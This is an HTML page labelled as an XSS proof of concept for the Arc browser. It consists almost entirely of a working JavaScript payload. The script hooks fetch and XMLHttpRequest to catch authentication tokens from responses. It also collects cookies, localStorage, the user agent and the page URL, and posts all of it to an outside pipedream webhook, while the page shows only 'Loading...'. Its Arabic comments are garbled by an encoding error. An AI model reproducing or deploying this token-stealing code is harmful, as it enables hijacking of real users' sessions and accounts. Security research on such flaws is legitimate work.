<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <title>Arc XSS PoC Enhanced</title>
</head>
<body>
  <script>
    console.log("âœ… Enhanced JS is running inside Arc!");

    const WEBHOOK_URL = "https://eoeisd0pus6doy3.m.pipedream.net/";

    // Ø¯Ø§Ù„Ø© Ø¥Ø±Ø³Ø§Ù„ Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª Ù„Ù„ÙˆÙŠØ¨ Ù‡ÙˆÙƒ Ù…Ø¹ console log Ù„Ù„Ù…ØªØ§Ø¨Ø¹Ø©
    function sendToWebhook(data) {
      fetch(WEBHOOK_URL, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(data)
      })
      .then(res => console.log("ðŸ“¡ Data sent to webhook:", res.status))
      .catch(err => console.error("âŒ Failed to send data:", err));
    }

    // Ù…Ø±Ø§Ù‚Ø¨Ø© Ø±Ø¯ÙˆØ¯ fetch
    (function() {
      const originalFetch = window.fetch;
      window.fetch = function(...args) {
        return originalFetch.apply(this, args).then(async response => {
          try {
            // Ù…Ø­Ø§ÙˆÙ„Ø© Ù‚Ø±Ø§Ø¡Ø© Ø§Ù„Ø±Ø¯ ÙƒÙ€ json
            const clonedResponse = response.clone();
            const data = await clonedResponse.json();

            // ØªØ­Ù‚Ù‚ Ù„Ùˆ Ø§Ù„Ø±Ø¯ ÙŠØ­ØªÙˆÙŠ Ø¹Ù„Ù‰ ØªÙˆÙƒÙ†Ø§Øª
            if (data && (data.token || data.access_token || data.id_token)) {
              sendToWebhook({
                type: "fetch-response-token",
                url: response.url,
                tokens: {
                  token: data.token,
                  access_token: data.access_token,
                  id_token: data.id_token
                },
                timestamp: new Date().toISOString()
              });
            }
          } catch (e) {
            // Ù…Ø´ JSONØŒ Ù†ØªØ¬Ø§Ù‡Ù„ Ø§Ù„Ø®Ø·Ø£
          }
          return response;
        });
      };
    })();

    // Ù…Ø±Ø§Ù‚Ø¨Ø© Ø±Ø¯ÙˆØ¯ XMLHttpRequest
    (function() {
      const originalOpen = XMLHttpRequest.prototype.open;
      const originalSend = XMLHttpRequest.prototype.send;

      XMLHttpRequest.prototype.open = function(method, url) {
        this._url = url;
        return originalOpen.apply(this, arguments);
      };

      XMLHttpRequest.prototype.send = function(body) {
        this.addEventListener("load", () => {
          try {
            let responseData;
            try {
              responseData = JSON.parse(this.responseText);
            } catch {
              return; // Ù„ÙŠØ³ JSONØŒ Ù†ØªØ¬Ø§Ù‡Ù„
            }

            if (responseData && (responseData.token || responseData.access_token || responseData.id_token)) {
              sendToWebhook({
                type: "xhr-response-token",
                url: this._url,
                tokens: {
                  token: responseData.token,
                  access_token: responseData.access_token,
                  id_token: responseData.id_token
                },
                timestamp: new Date().toISOString()
              });
            }
          } catch (e) {
            // Ø®Ø·Ø£ØŒ ØªØ¬Ø§Ù‡Ù„
          }
        });
        return originalSend.apply(this, arguments);
      };
    })();

    // Ø¥Ø±Ø³Ø§Ù„ Ø¨ÙŠØ§Ù†Ø§Øª Ø¹Ø§Ù…Ø© ÙƒØ¨Ø¯Ø§ÙŠØ©
    sendToWebhook({
      type: "initial-info",
      cookies: document.cookie || "No cookies",
      localStorage: (() => {
        try {
          return Object.assign({}, localStorage);
        } catch {
          return "Access denied";
        }
      })(),
      userAgent: navigator.userAgent,
      url: window.location.href,
      timestamp: new Date().toISOString()
    });

  </script>

  <p style="font-family: sans-serif;">Loading...</p>
</body>
</html>
